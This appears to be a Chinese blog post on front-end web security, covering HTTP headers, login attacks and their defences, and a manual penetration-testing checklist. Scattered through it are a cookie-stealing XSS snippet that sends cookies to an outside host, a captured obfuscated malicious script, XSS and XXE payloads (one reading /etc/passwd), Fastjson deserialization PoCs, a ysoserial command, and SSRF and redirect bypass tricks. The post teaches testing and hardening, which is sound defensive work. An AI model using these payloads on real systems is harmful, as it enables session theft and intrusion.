---
layout:     post
title:      前端的安全左右互搏
date:       2022-02-07
author:    	边黎安
header-img: img/tag-bg.jpg
catalog: true
tags:
    - web
    - safe
    - 前端安全
---


## 工欲善其事必先利其器。推荐工具Fiddler，很多时候F12的工具还是有点弱，我们需要一款能动态修改参数后还能重新发起请求的工具，恰好Fiddler都能胜任。网上和内网中使用说明较多，大家自行补脑.
![](https://img.alicdn.com/L1/461/1/262e038acb97553408697e94b04b6d239e68db2d)


## 大家应该都见过上图中的类似情况吧，先拿百度的图片举个例子，百度服务器上的图片经常禁止其他第三方网站直接引用。同样都是一个图片链接，为什么百度的网站显示正常，而第三方的网站显示异常呢？
这是因为百度开启了来路验证，通过检查此链接是否是在百度旗下的二级域名中打开。而这个来路信息在HTTP协议的什么地方呢？
直接上Fiddler工具的截图，一个网站A引用了一个网站B的图片，当浏览器在打开网站B的图片链接时，浏览器将网站A的地址偷偷隐藏在了HTTP请求的Referer信息了，百度就是通过检查此信息以拒绝第三方网站的请求。


### 通过抹除Referer信息或者篡改HTTP Head中的来路信息（Referer）可以轻松实现跳过百度的限制。
![](https://img.alicdn.com/L1/461/1/9ae7257e3812f410165eecd9aa8aff8750e65c36)
### 浏览器只能查看到地址栏的链接，但是在浏览器发起请求时，传输给服务器不仅仅是URL地址信息。到底有多少信息在我们不知情的情况下传输呢？所以我们先分析下HTTP原理

## HTTP原理讲解
当我们输入一个url，浏览器到底帮我们做了什么？

1. 域名解析 地址变成对应服务器IP（攻击方式：DNS劫持 略）
2. 建立连接 TCP三次握手 （ 攻击方式：Ddos攻击略）
3. 发起HTTP请求 request (三部分：请求；头信息；内容)
![](https://img.alicdn.com/L1/461/1/1700b08f9b155e97e13c3a482ef279c37cc9c34e)

第一部 请求信息: 请求方法(Get\POST)+请求网址+HTTP版本
第二部 头信息，以下简称Head信息，由上至下详细说明：
Host 用来标识请求服务器上的那个虚拟主机，比如Nginx里面可以定义很多个虚拟主机 那这里就是用来标识要访问那个虚拟主机。
Connection 告诉服务器支持keep-alive特性
Content-Length 内容长度
Accept 就是告诉服务器端，我接受那些MIME类型
User-Agent 用户代理，一般情况是浏览器，也有其他类型，如：wget curl 搜索引擎的蜘蛛等
Referer 来路信息，请求来源于哪个网站（百度通过此字段来路是否正确，操作此字段跳过部分验证）
Accept-Encoding 这个看起来是接受那些压缩方式的文件
Accept-Lanague 告诉服务器能够发送哪些语言
Cookie 每次请求时都会携带上Cookie以方便服务器端识别是否是同一个客户端
第三部 内容
POST的时候参数信息，Get的时候为空

4. 接受HTTP响应 response
![](https://img.alicdn.com/L1/461/1/c77092529abb1a440d8e138a09530c37701b351b)

也是三部部分（响应状态+Head+Body）
- Server 使用的WEB服务器
- Date 响应的日期
- Content-type MIME类型为html类型，字符集是 UTF-8
- Connection 使用keep-alive特性
- Content-Encoding 使用gzip方式对资源压缩
- Set-Cookie 设置客户端这边的Cookie信息:
埋个问题，后面细讲：“Set-Cookie: at=71fe0cca-6205-42b7-85fd-629f30cf2df7%7C5e68b7f6-73b9-452c-8edc-25d6b382b2d5; Path=/; HttpOnly”

HTTP请求原理讲解完毕，继续回归网站安全，我们选取一个日常操作中高风险的登陆操为例来说明。

五.登陆操作
我们先分析简单的通过用户名+密码进行登陆操作。步骤拆解为：
输入：用户名和密码，
输出：收到登陆状态和登陆信息。
然后以后的操作都需要包含这些登陆信息，服务器就能判断是用户A登陆还是用户B登陆了。

攻击1：（模拟输人）
矛1-1：恶意提交
防御原理
- 正常的操作前，用户一般需要先访问一个特定的地址（例如：需要输入的登陆框）以查看需要输入哪些参数。
- 针对这个特性：我们在用户正常操作的表单(登陆操作是输入用户名和密码)中，多隐藏一个参数(CSRF)在输入框界面中，稍后点击提交时，表单会自动携带这个额外参数，如果没携带就是非法请求(恶意提交)。
- 如果我们的网站没有添加这个额外参数，网站又名：具有CSRF漏洞。
（由于CSRF验证获取难度小，也不是一次性的，所以不能说能防御撞库，仅能防御恶意脚本，谢谢”远遥“）

矛1-2：穷举法的撞库
原理：通过不停用的变化输入信息（用户名和密码），然后发送到服务器验证是否正确。防御手段也相对简单，就是提高输入隐藏限制。

防御1：限制次数
手段可以是：I、通过账号限制，如果一个用户输入3次密码后锁定账户20分钟。
II、通过外网IP限制，检测错误频率，封杀外网IP。

防御2：增加输入成本
暴力破解除了穷举法外是否还有其他思路呢？像我们如果要破解客户端的小程序话，往往是通过汇编程序找到判断密码是否相等的代码改为“不等”才是更高效的破解办法。登陆是否有类似粗暴的破解方法吗？答案是肯定的，那就直接窃取登陆信息。

攻击2：（入侵输出）窃取登陆状态
我们将窃取登陆状态想象为入室盗窃的话，这就好比小偷不用跟你家钻石级防盗门较劲了，而是乘主人打开门后也进去搬点东西。其危害更大。

矛2-1：通过XSS注入获取登陆状态
Xss漏洞就是网页能被插入脚本。多发生在网页接受参数时。
现在前端发展的越来越强大，JavaScript能干的事情也越来越大。先秀短代码

var url=document.top.location.href;
var cookie=document.cookie;
var c=new Image();
var c.src=’http://www.B.x/?c=’+cookie+’&u=’+url;
短短4行代码就实现了将网站A的cookie信息发送给了网站B，完成了窃取Cookie。
大家可能会说我们的网站没有XSS漏洞，那就不用担心这个问题吧？那你的网站是否有引入第三方js文件呢？如果这个文件来源与不知名的小网站，很可能是被挂马了的。笔者曾经有幸抓到一段挂马代码，分享给大家。（挂马文件http://xxx.com/scripts/jquery/jquery.form.js）

var _0x8d17=["\x3B\x52\x42\x51\x48\x4F\x53\x1F\x72\x71\x62\x3C\x67\x73\x73\x6F\x39\x2E\x2E\x24\x36\x36\x24\x36\x36\x24\x36\x36\x24\x31\x44\x24\x36\x33\x24\x36\x37\x24\x36\x30\x24\x36\x30\x24\x36\x35\x24\x35\x38\x24\x36\x2F\x24\x32\x31\x24\x32\x2F\x24\x32\x30\x24\x32\x2F\x24\x31\x44\x24\x35\x32\x24\x35\x45\x24\x35","\x43\x2E\x24\x35\x30\x24\x36\x32\x24\x36\x2F\x24\x35\x44\x24\x35\x34\x24\x36\x33\x24\x34\x45\x24\x35\x32\x24\x35\x42\x24\x35\x38\x24\x35\x34\x24\x35\x44\x24\x36\x33\x2E\x24\x35\x30\x24\x35\x40\x24\x35\x30\x24\x36\x37\x24\x31\x44\x24\x35\x40\x24\x36\x32\x3D\x3B\x2E\x72\x62\x71\x68\x6F\x73\x3D","\x6C\x65\x6E\x67\x74\x68","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x77\x72\x69\x74\x65"];
var cookies=_0x8d17[0];
var hos=_0x8d17[1];
//function outChar(){
var _0x7f92x4=cookies+hos;
var _0x7f92x5=_0x7f92x4[_0x8d17[2]];
var _0x7f92x6=_0x8d17[3];
for(i=0;i<_0x7f92x5;i++)
{var _0x7f92x7=_0x7f92x4[_0x8d17[4]](i);
_0x7f92x7++;_0x7f92x6=_0x7f92x6+String[_0x8d17[5]](_0x7f92x7);}
没看明白?直接附上F12的运行效果。
_
在打印到页面上就可以实现XSS入侵了。（题外话：这段代码还可能给我们加密js代码来点启发。）
其实防御窃取Cookie有相对更容易办法。

盾1：不许JavaScript搬Cookie，又名“HttpOnly”，就是上面埋点的代码。
```
  “Set-Cookie: at=71fe0cca-6205-42b7-85fd-629f30cf2df7%7C5e68b7f6-73b9-452c-8edc-25d6b382b2d5; Path=/; HttpOnly”
```
我们将需要保护的Cookie信息，可以对Cookie的键值设置上HttpOnly这个重要标签，浏览器就帮我们限制JavaScript不能访问这部分信息；而不需要保护的Cookie信息，让javascript可以正常操作。两全其美。

webx项目session化时启用httponly

盾2：数据加密
谈安全少不了数据加密，加密的三个法宝：

I. 单向加密：摘要算法（例如Hash，MD5签名）
此种加密不可逆。将需要保护的对象的完整信息保存在服务器，客户机上仅有Hash后的Key。根本上杜绝用户篡改。
- Session其实就是这种原理。用户的浏览器的Cookie里带了一个Token来标记，服务器取得了这个Token并且检查合法性之后就把服务器上存储的对应的状态和浏览器绑定。
- 业务参数也可以通过此办法保护,附最近研究一个国外网站发现起将ajax请求用添加一个hash验证位。可以学习
```
  <script>
    var authHash = '7fd0a6d8d88ed9ccc79c26987075ab0141f2b764';
  </script>
```
II. 对称加密 DES IDEA RC4 AES
III. 不对称加密 RSA ECC
分布式架构中，也有很多信息必须使用可逆的双向加密。可以考虑使用加密信息保护。
附webx项目session化时启用aes对称加密
```
<session-stores:encoders>
  <session-encoders:serialization-encoder>
      <session-serializers:hessian-serializer />
      <session-encrypters:aes-encrypter key="****************" />
  </session-encoders:serialization-encoder>
</session-stores:encoders>
```
防御3：状态信息的变化性
登陆状态绝对不适用接口的等幂性（一次或多次请求结果一样）。同一个账号每次登陆后生成的Cookie信息都应该不一样。
如果这次跟上次的登陆信息一样了，就等于小偷配了你家钥匙。虽然你离开家时，他进不来；但是你在家的时候，他也可以进出。
其实很好解决：每次登陆成功后，生成状态信息时都多融入一个随机GUID一起进行数据加密即可。

## 总结
手工安全测试
目前安全扫描工具可以覆盖很多安全漏洞，但还是有一部分安全漏洞是工具无法发现的，需要进行手工测试，主要包括：存储型XSS漏洞、业务/敏感信息泄露、CSRF、Jsonp劫持、水平/垂直越权和未授权访问、登录安全等。
XSS漏洞
漏洞定义：攻击者往web页面插入js代码，当用户浏览页面时，嵌入的代码会被执行，达到恶意攻击用户控制浏览器的目的。XSS漏洞分为3类：反射型、存储型、DOM型。前端页面只要跟后端有交互，就需要测试xss漏洞。手工测试时，只需要关注存储型XSS。反射型和DOM型可以使用安全扫描工具扫描。

​

反射型XSS：攻击者将跨站代码写在链接中，受害者请求这种链接时，跨站代码经过服务端反射回来触发，此类代码不会存储到服务端。
测试方法：页面请求中的参数是用户控制的，即参数是从前一个页面中获取的，比如搜索结果url中带的搜索关键词，预览页面url中带了之前编辑页面中用户输入字段等，将这些字段替换为XSS校验字符串，check是否有alert框出现，如有则有漏洞；

​

DOM型XSS：由js脚本动态创建，输出到页面造成的。此类型不需要经过服务器。
测试方法：

1.check所有ajax请求的响应头的content-type不能是text/html，json为·application/json·, jsonp为·application/javascript·

2.check对jsonp的callback参数值做了长度(128字符) 和字符 ([^0-9a-zA-Z_\.])的限制

​

存储型XSS：攻击者将恶意数据存储到服务端的数据库中，服务器脚本从数据库中获取该数据后，没有进行安全处理即显示在公开页面上，受害者访问该页面即中招。
测试对象：应用中的全部输入表单

测试方法：

页面表单里的每个输入项输入一段js脚本后，提交查看结果
前端输入长度被限制，使用抓包工具拦截，修改请求中相应字段值为js代码再发送
当待测页面无表单提交时，针对页面请求，可以将参数值更改为js代码段后重新请求，查看结果。
常用js脚本：
```
</script><script>alert(1)</script> 
"><img src=x onerror=alert(1)>
<body onload=alert(1)>
<script onreadystatechange=alert(110)>
31'13"<script>alert(42)</script>24<99
```
结果分析：

针对以上XSS校验脚本，如果执行后有js对应的alert弹窗出现，表示存在xss漏洞
如果请求执行成功，无弹窗出现，需要进一步分析：需要查看这些js代码是否已经存入数据库表中。如果是，需要对数据读取的相关功能进行测试，保证这些js代码在数据读取、展现过程中不会被执行；对于未存入数据库的情况，则需要关注请求后的response中是否可能有这些js代码，是否会被当前页面执行。
​

CSRF漏洞
漏洞定义：链接的表单提交的所有请求参数都可以被预测，攻击者构造好一个站内URL或给第三方站点放置一个可自动提交的表单，当合法用户在登录状态时，攻击者诱使其点击，此时就会在用户不知情的情况下执行了攻击者伪造的请求。

 

CSRF漏洞 vs XSS漏洞：

CSRF漏洞：把伪造好的表单请求发送给对方，对方会以他个人身份提交表单，但是对方并不知道这个表单的含义和来源
XSS:把一个连接发送给对方，或者是某个页面带有存储型XSS，会自动获取对方当前登录的信息发送给攻击者，攻击者以他的身份登录系统
测试对象：应用中的写操作

测试方法：

对查询类的URL进行检查，请求和返回值中均不能含token，以防token泄露
对所有增删改操作的URL进行检查，看请求参数中是否存在token，如果没有token则存在风险
如果存在token，则通过抓包工具将token设置为空以及为任意token进行重放，检查是否能够成功执行，如果执行成功，则存在安全风险
结果分析：

1.查询类的请求：只需要查看请求和响应结果是否包含token，若包含则测试不通过。

2.增删改类的请求：使用任意的token执行请求后，操作未执行成功，数据未发生变化，则测试通过。

JSONP漏洞
漏洞定义：为了解决跨域问题，使用Jsonp方式传输数据，由于数据很难做到权限校验，攻击者可以构造带有该jsonp接口的恶意页面，发给用户点击，从而用户的敏感数据通过jsonp接口传输到攻击者的服务器上。

测试对象：返回JSON格式数据的查询接口

测试方法：

先确认是否使用jsonp接口传输数据，发现请求使用了json或callback进行参数传输时（例如：/log/loghttp?callback=Jquery1235dswer&category=2），则将请求中的xx.json改成xx.jsonp?callback=xx(例如：/log/loghttp.jsonp?callback=Jquery1235dswer&category=2)，进行请求重放，若接口返回正常，则说明同样支持jsonp，服务端没有区分json和jsonp方式
对所有返回值为json/jsonp的接口检查是否存在敏感信息（用户账号、密码、业务敏感数据等），没有则忽略，因为攻击者拿到这些信息没有用处，不存在jsop劫持风险
检查请求是否存在token。若有token通过抓包工具拦截，将token设置为空或错误的值进行请求的重放，若返回正常，则说明服务端未做校验，存在jsonp劫持风险
若请求不存在token，则检查refer，将refer设置为空或将之前的refer替换为其他不同域名的url，例如：www.baidu.com，若返回正常，说明服务端未对refer检查，存在jsonp劫持
token或refer其一有校验，则不存在劫持
敏感数据尽量不要使用jsonp进行跨域传输，如果需要Jsonp接口的后端需要对referer进行校验，只允许受信任的调用方域名的页面里面嵌入我们的JSONP，域名是否受信任可使用安全包的URL百名单校验函数检查
结果分析：

1.检查是否存在token。若有token，将token设置为空或错误的值，重放请求若返回正常，则说明服务端未做token校验，存在jsonp漏洞。

2.若无token，检查refer。将refer设置为空或将之前的refer替换为其他不同域名的url，若返回正常，说明服务端未对refer检查，存在jsonp漏洞。

3.token或refer其一有校验，则不存在漏洞。

XXE漏洞
漏洞定义：XXE（XML 外部实体注入），通过 xml 的外部实体引用机制，插入恶意引用代码实现文件读取、网络请求等操作。

测试对象：主要出现在请求body中携带xml格式文本的接口

测试方法：

首先确定当前接口是否解析 xml 文件，通过发送 xml 格式文件进行判断，如果直接传送不解析，尝试修改 content-type 为 application/xml
确定服务器可解析 xml 格式后，传送测试用例进行外部实体访问注入，判断是否能够发送访问请求
对于有回显的注入直接在返回包中观察返回结果，对于无回显的注入通过dnslog方式进行判断。
判断XXE是否被解析
```
  <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE c [
        <!ENTITY a "11111">
    ]>
    <c>&a;</c>  // 如果 a 显示 11111 说明被解析

  有回显测试
  <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPe root [
      <!ENTITY % outfile SYSTEM "file:///etc/passwd">
  ]>
  <root><outfile>&outfile;</outfile></root>

  无回显测试
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE note[ 
  <!ENTITY % test SYSTEM "http://***.***.***.***:**/test">
  %test;
  ]>
  image.png
```

权限漏洞
漏洞定义：Web应用或接口权限控制不当，攻击者可以访问到他人信息或者进行操作。分为：水平权限漏洞、垂直权限漏洞、未授权访问

水平权限漏洞：用户A可以对同级别的用户B的信息进行访问和操作
垂直权限漏洞：用户A可以对不同级别（如管理员）的用户B的信息进行访问和操作
未授权访问：任意用户（包含未登录用户）均可以对所有用户的信息进行访问和操作
水平权限漏洞

测试对象：含有用户 id、订单 id、账号id 这类参数的请求

测试方法：

准备2个账号，浏览器A以账号1登录，浏览器B以账号2登录
使用抓包工具抓取浏览器A对账号1可以执行的全部操作请求，对每个请求包含的Post数据、cookies进行检查，以及账号1的用户名、ID，操作ID等是否可遍历，如果没有则无漏洞，否则进入下一步
修改上一步中发现的可遍历信息为账号2的对应信息，然后进行重放（此时用户session仍为账号1），如果重放成功，访问到账号2的信息，或对其进行了操作，则存在漏洞
结果分析：对于请求中的ID进行篡改，改成其他账号对应的ID，check是否能获取到其他账号的业务数据，如可以获取，则存在水平权限漏洞。

​垂直权限漏洞

测试对象：带有主账号、子账号等分级操作的应用

测试方法：

准备2个账号，浏览器A登录高级别用户账号1，浏览器B登录普通用户账号2
使用抓包抓取在浏览器A对账号1可以执行的全部操作请求，对每条请求的URL（含POST请求）、cookie进行检查，cookie条目默认设置为HttpOnly ，需要被浏览器脚本访问条目允许设置为非HttpOnly。查看是否存在涉及账号1的用户名、ID、操作ID等可遍历的信息，或者表示管理权限的标示。如果没有，则无漏洞，否则进行下一步
```
  // Servlet version >= 3.0
  Cookie cookie = new Cookie("name", "value");
  cookie.setHttpOnly(true);
  response.addCookie(cookie)
  // Servlet version < 3.0
  response.addHeader("Set-Cookie", "name=value; Path=/; HttpOnly");
​```

在浏览器B中，修改上述发现的可遍历信息为账号1的对应信息，或者修改管理员权限标示，然后进行重放（注意：此时用户session仍为账号2），如果重放成功，访问到了高级别账号1的信息，或者可进行高级别账号的操作，说明存在漏洞。
结果分析：主子账号的权限，根据业务实际情况check子账号是否可以越权。一般业务，主账号可以查看子账号的所有信息，这一正常场景的功能点需要覆盖。

​​未授权访问：特别注意业务场景中免登陆的页面信息展示，比如给用户发个包含某url的邮件，用户点击url不用登录就可以查看自己的敏感数据，这里就存在很大的安全风险，虽然url只发给了当前用户，但不能保证该url不被其他人非法获取(如搜索引擎、邮箱被盗等等）

漏洞定义：未授权访问，由于缺乏安全配置或权限认证导致的应用或部分接口可以任意访问的漏洞。未授权访问包括未授权接口和业务依赖中间件未授权两部分。

测试对象：业务场景中免登陆的页面信息展示

测试方法：

对于未授权业务接口，测试思路先从代码审计层面判断当前接口是否存在鉴权方法，再通过Burp抓取正常的接口请求，删除请求包中的cookie或token头字段，查看请求是否依然能够正常执行。
对于未授权中间件，需要事先通过prd评审或咨询业务方了解当前产品使用的中间件，容易产生未授权访问的应用通常包括redis、jenkins、zookeeper、elk、grafana、docker api等。
敏感信息泄露
漏洞定义：由于业务系统本身不安全的设置，譬如未经脱敏的个人信息、敏感信息可遍历查询、未做权限校验，导致大量敏感信息泄露，从而造成黑产诈骗。主要包括用户敏感信息泄漏和异常报错信息泄漏两种。

测试对象：用户真实姓名、nick、手机号、身份证号、银行卡号、订单号、邮箱、个人住址等

测试方法：

用户敏感信息泄漏：业务确认，定义敏感数据范畴。
通过抓包工具抓取请求和返回，查看是否携带敏感信息，敏感信息前端展示与接口返回是否一致；直接展示(不需要登录)敏感信息的页面需要评估风险，做防爬（SM）接入，避免信息泄露
确认应用关键key是否存储在请求或返回值中
敏感数据是否可遍历化，例如id、id+1
异常报错信息主要通过单引号、错误类型数据、异常截断符等符号测试请求响应中是否存在可以作为进一步攻击利用的报错信息。

Utf漏洞
漏洞定义：使用了jsonp的请求都需要进行测试，简单来说只需看请求中是否含有callback参数。

测试方法：使用以下字符串替代请求中的callback值进行请求。

callback=x%0AContent-Id%3Ad%0AContent-Transfer-Encoding%3Abase64%0d%0a%0d%0aPHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4%3D%0A!d

如果存在多个callback参数，可以删除至一个将其替换进行测试。

结果分析：若结果中x前面有空格，表示测试通过，反之，表示存在utf漏洞

例子：仍是家具惠二期的请求：http://server.jia.daily.tmall.net/jjh/participate.do?id=402&sourceType=4&userCouponId=10061&_ksTS=1407218495474_79&callback=jsonp80

替换callback参数后重新请求，结果为：x前面是有空格的，说明代码中对utf漏洞做了处理，测试通过。



​​

URL重定向漏洞
漏洞定义：服务端未对传入跳转变量做检查，导致攻击者可构造恶意地址，诱导用户跳转到恶意网站。URL 重定向可以分为前端重转发和后端重定向。

测试对象：

测试方法：

URL 重定向的外在判断和 SSRF 有相似的地方，不同之处在于实际访问逻辑发起是在服务端还是客户端。URL 重定向主要出现在需要页面跳转的接口

前端转发主要由 JS 发起请求，常见前端跳转方法为 window.location.href，后端重定向会在返回包中看到 Location 头
URL重定向常见的漏洞关键字有 redirect、url、jump、link 等，测试时将对应键值修改为 www.baidu.com 分析页面是否跳转。
常见的bypass有以下几类：
www.alipay.com.evil.com
www.alipay.com@evil.com
1.替换url为带js代码的链接后，重新请求查看结果

2.URL外部重定向的目标地址必须执行白名单过滤

try {
  if (targetUrl != null && com.alibaba.fasttext.sec.url.CheckSafeUrl.getDefaultInstance().inWhiteList(targetUrl)){
      response.sendRedirect(targetUrl);
  }
} catch (Exception e) {
  logger.error("Check returnURL error! targetURL=" + targetURL, e);
  throw e;
}
结果分析：如果页面跳到了正确的链接，且js代码未被执行，表示测试通过。

image.png

​​

Fastjson反序列化
漏洞定义：Fastjson 反序列化，由于auotype特性引起的反序列化漏洞。Fastjson在解析json过程中，支持使用autoType来实例化一个具体的类，并通过json填充属性值。

测试对象：从 pom.xml 和实际应用包中引入第三方反序列化版本包

测试方法：内部应用重点关注 Hessian 和 Fastjson 的反序列化，详细描述参考代码设计指南部分的三方包反序列化。

不同版本的Fastjson bypass类或poc：

1.2.24 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/", "autoCommit":true}
1.2.42 {"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://localhost:1099/", "autoCommit":true}
1.2.45  {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099"}}
1.2.47 {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/","autoCommit":true}}
Hessian反序列化
漏洞定义：Hessian 反序列化漏洞，反序列化 HashMap 对象时，会将其所有键值单独反序列化，再通过put方法重新建立一个HashMap。

测试对象：从 pom.xml 和实际应用包中引入第三方反序列化版本包

测试方法：第三方包反序列化主要通过代码审计的方式从 pom.xml 和实际应用包中确认三方包版本。

Hessian 曾经出现绕过的黑名单类：

org.springframework.beans.BeanWrapperImpl.BeanPropertyHandler#getValue
org.apache.velocity.runtime.resource.Resource#isSourceModified()
org.springframework.expression.spel.ast.Indexer.PropertyIndexingValueRef#getValue()
org.mortbay.log.Slf4jLog#isDebugEnabled()
org.springframework.expression.spel.ast.MethodReference.MethodValueRef#getValue()
不安全的反序列化
漏洞定义：不安全的反序列化，恶意构造的序列化输入进行反序列化而产生非预期的对象调用所产生的漏洞。反序列化漏洞主要分为原生反序列化和第三方包反序列化漏洞。

测试对象：原生反序列化是通过 readObject 将序列化数据转化为 Java 对象

测试方法：

原生反序列化的测试主要观察请求数据中是否有序列化数据特征，如 16 进制的 aced0005 和 base64 编码的 rO0AB
测试 payload 可以使用 ysoserial 的 URLDNS 模块生成，利用 dnslog 方式进行判断
原生反序列化可以重点从代码审计角度判断是否有 readObject 调用
ysoserial 的 URLDNS 调用，注意选择正确的编码格式

java -jar Downloads/ysoserial.jar URLDNS "http://xxx.xxx.com" | base64
系统命令执行
漏洞定义：系统命令执行，由于服务端没有做控制或过滤，导致用户输入被作为操作系统命令执行的一部分运行而产生任意命令执行。

测试对象：常见系统命令执行主要是 OS 接口直接调用，Docker api、staragent、定时任务等间接调用点。

测试方法：

系统命令执行主要看请求中是否有类似系统命令的敏感参数，如 cmd
对应参数值中直接执行带外请求，如 http 请求，dnslog 等，同时可以使用管道符进行拼接 bypass
系统命令执行可以重点从代码审计角度出发，分析代码中是否有拼接执行系统命令的操作
常见连接符： &、|、||
测试用例：

OS 直接调用主要通过 whoami、curl、ping 等系统函数，配合管道符进行测试

Docker API 调用参考官方api文档 https://docs.docker.com/engine/api/v1.24/

Staragent API 调用文档 https://yuque.antfin-inc.com/staragent/help/xehod1

身份鉴别不当
漏洞定义：身份鉴别不当，有身份认证措施但由于认证措施逻辑问题或配置问题导致的认证措施可绕过。

测试对象：API 加签不当，由于签名配置或校验不当导致的未授权

测试方法：通过修改参数重放签名、置空签名等手段进行测试。

1.前端鉴权，仅在前端页面通过ajax接收返回码判断，跳转等方式进行鉴权的方法。这种鉴权方式通过Burp抓包修改返回包或拦截丢弃跳转包，直接测试后端接口查看是否能够未授权调用。

2.cookie简单标志位鉴权，通过在cookie中设置可猜测值的标志位进行鉴权，这种鉴权方式对比有权限账号的cookie标志位进行构造，判断是否能够未授权调用。

3.cookie httponly，对于直接影响身份判断的cookie值应该设置httponly，测试时观察相应位置的cookie是否存在httponly标示。

批量攻击
漏洞定义：批量攻击包括扫号、撞库、爆破等攻击，通常是由于接口未对请求次数或请求频率进行限制导致的漏洞。

测试对象：批量攻击主要面向账号注册、找密、登陆等场景。

测试方法：

利用 Burp 进行字典爆破，判断是否可以爆破用户名或密码。
判断当前接口是否有验证码、RDS 等防护措施，同时需要判断当前防护措施是否有效。
常见的验证码失效场景有：验证码可重用、验证码可从返回包获取、验证码总数有限、验证码可绕过等。
目录遍历/文件遍历
漏洞定义：未对目录路径和文件路径的根路径进行限制，导致攻击者可以遍历获取路径信息，直接读取任意文件。

测试对象：获取目录路径和文件路径的场景

测试方法：

在有文件操作功能的页面，通过修改 path 等参数进行目录和文件读取测试。
结合代码审计可以判断当前的文件/目录读取路径是否能够通过 ../../ 或者它的变体任意跳转。
不安全的加密存储
漏洞定义：指对重要信息不进行加密或加密强度不够，未安全存储加密信息的相关漏洞。包括密码明文传输、明文存储、加密算法缺陷等问题。

测试对象：主要是密码传输、存储功能，支付场景。

测试方法：

通过抓包判断当前用户密码传输是否加密
判断敏感支付接口是否有验签机制，验签机制是否存在绕过
结合代码审计可以明确当前加密算法类型，按照加密合规要求进行测试
结合代码审计可以查看当前加解密密钥配置，原则上禁止明文配置密钥，需要使用KMI/KMS保管密钥
OSS安全漏洞
漏洞定义：OSS安全，在使用OSS存储过程中由于错误配置而导致的上传下载问题。

测试对象：应用中使用OSS存储

测试方法：

加密问题，OSS提供服务器端加密、客户端加密以及数据传输加密，根据实际场景加密要求可以测试是否对传输信息进行加密配置
上传控制问题，测试OSS的上传请求是在前端发起还是在后端发起，前端发起的OSS请求重点测试文件上传类型设置是否可绕过，accesskey是否存在泄漏。
下载控制问题，OSS 存储文件下载是否有验签，验签机制是否有效，直接访问无验签的 OSS 资源地址判断是否可以访问资源，OSS 存储文件是否可遍历访问，观察 OSS 文件名是否有规律可以进行爆破读取。需要根据实际场景传输文件的安全性要求判断当前的上传下载控制是否合理​​
SSRF漏洞
漏洞定义：SSRF（服务端请求伪造），是一种由攻击者构造形成由服务端发起请求的漏洞。SSRF 攻击链接由攻击者构造，由服务器发送请求。

测试对象：需要服务器发起请求的场景，包括网关转发、图片加载、心跳判断、远程日志请求等。

测试方法：

首先关注请求参数中的特殊参数名，如 url、path、ip、host、goto、address、domain 等
同时关注上述参数的实际含义值，以及它们的变体，如十进制、八进制
在对应的参数点使用本地地址或内部 DNS 测试服务器地址进行测试，注意使用绕过策略
常见绕过技巧包括：
“@”符，http://baidu.com@www.baidu.com
IP地址进制转换，192.168.1.1——>0xC0A80101——>3232235777
URL二次跳转，通过在中间服务器放置跳转脚本，先访问合法中间服务器，再由中间服务器脚本向服务器发起跳转请求
短网址绕过
xip.io绕过，http://xxx.192.168.1.1.xip.io/
在进行对应参数测试时，可以使用多种协议进行探测包括 http://、ftp://、file://等
再进行SSRF漏洞测试时，需要排除请求来源于浏览器客户端


登录安全
漏洞定义：由于登录未做好安全控制和业务策略防控，导致用户的账号可以被暴力破解，导致账号丢失，黑产诈骗，威胁整个可信生态。

测试对象：应用中的登陆功能

测试方法：

1、确认登录是否接入No-Captcha人机识别验证码

2、身份认证是否接入Durex二次验证，设备识别Umid

3、若未接任何集团产品，是否存在验证码（注意：每次请求后服务端销毁此次的验证码）

4、是否存在限制（错误）请求次数（包含密码尝试和验证码尝试）

5、是否存在业务上惩罚xx分钟，同时验证码变换

6、重要登录口，需确认是否接入手机二次登录验证+设备识别Umid，保障非可信设备输入短信验证

7、短信发送接口，查看是否同一设备或ip有短信发送尝试次数限制

8、是否管理后台不对外网开放，并接入BUC/ACL/OPLOG

文件上传
漏洞定义：任意文件上传，对于提交的文件扩展名、文件类型、文件内容校验或过滤不严格引起的漏洞。

测试对象：存在上传功能的接口包括以下几个场景，图片上传、文本上传、表格上传和证书上传。

测试方法：

客户端js检查，客户端检查只能防止用户误操作，无法阻止攻击行为。客户端绕过通过上传正常规则文件利用Burp抓包绕过规则。
服务端检测又可以分为MIME检测、扩展名检测、文件内容检测。对于MIME检测，使用不同的MIME测试，分析输出的情况；对于扩展名，测试常见的恶意扩展名，如js、jsp是否能够成功上传，同时使用带有路径的文件名测试是否可以修改上传路径，使用截断符等特殊符号测试是否存在文件名解析漏洞；文件内容检测通常上传一个正常文件，在正常文件内容中嵌入恶意代码。
在测试上传漏洞的同时，可以根据返回的文件路径和文件名判断是否存在任意文件下载
通过代码审计来发现文件上传的扩展名限制、大小限制和文件生命周期是否合理。
1.使用带js脚本的图片执行上传操作后，查看结果。

2.或者使用抓包工具修改文件名后缀,若请求正常通过，则存在风险。

图片可以使用附件中的图片。使用写字板打开图片，可以看到下面一段js代码：



结果分析：图片上传成功后，查看上传到taobaocdn上的图片中是否还有js代码，如果有，表示测试不通过。

URL跳转
测试对象：带 url 类参数的请求

测试方法：修改请求中的 url 类参数，若请求跳转至非业务需求页面，则存在风险

邮件/短信轰炸
漏洞定义：邮件/短信轰炸，由于缺少身份、调用频率等限制而导致的功能滥用。攻击者可以通过接口大量发送邮件或短信给其他用户，即会影响正常用户，又会造成应用资损。

测试对象：常见于注册、找密、登陆等二次身份验证场景。

测试方法：

利用 Burp 抓取当前邮件、短信发送包，进行重放攻击，判断是否有频率限制等控制措施。
同时修改邮件、短信地址为其他授权地址，观察控制措施是否可被绕过。
任意代码执行
漏洞定义：由于服务端没有做控制或过滤，导致用户输入被作为后端程序语言运行而产生任意命令执行。

测试对象：服务端应用

